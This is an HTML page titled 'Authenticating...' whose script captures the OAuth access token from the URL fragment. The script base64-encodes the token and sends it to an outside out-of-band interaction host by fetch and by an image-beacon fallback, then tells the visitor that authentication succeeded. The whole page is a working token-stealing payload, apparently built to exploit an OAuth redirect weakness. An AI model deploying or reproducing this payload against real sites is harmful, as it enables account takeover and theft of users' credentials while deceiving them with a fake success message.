<!DOCTYPE html>
<html>
<head><title>Authenticating...</title></head>
<body>
    <h1>Extracting Token...</h1>
    <script>
        // 1. Capture the fragment (#access_token=...)
        var fragment = window.location.hash;

        if (fragment) {
            // 2. Your new OAST URL
            var oastUrl = "https://d5ofuuda9dbio9v97ls0xmcjxchecoj7h.oast.pro/?token_data=" + btoa(fragment);

            // 3. Primary Send: Fetch
            fetch(oastUrl);

            // 4. Secondary Send: Image fallback (highest success rate)
            var leak = new Image();
            leak.src = oastUrl;

            console.log("Token sent to OAST!");
            document.body.innerHTML = "<h1>Authentication Successful</h1><p>Check your OAST terminal for the interaction.</p>";
        } else {
            document.body.innerHTML = "<h1>Error: No fragment found.</h1><p>Ensure the URL contains a # fragment.</p>";
        }
    </script>
</body>
</html>
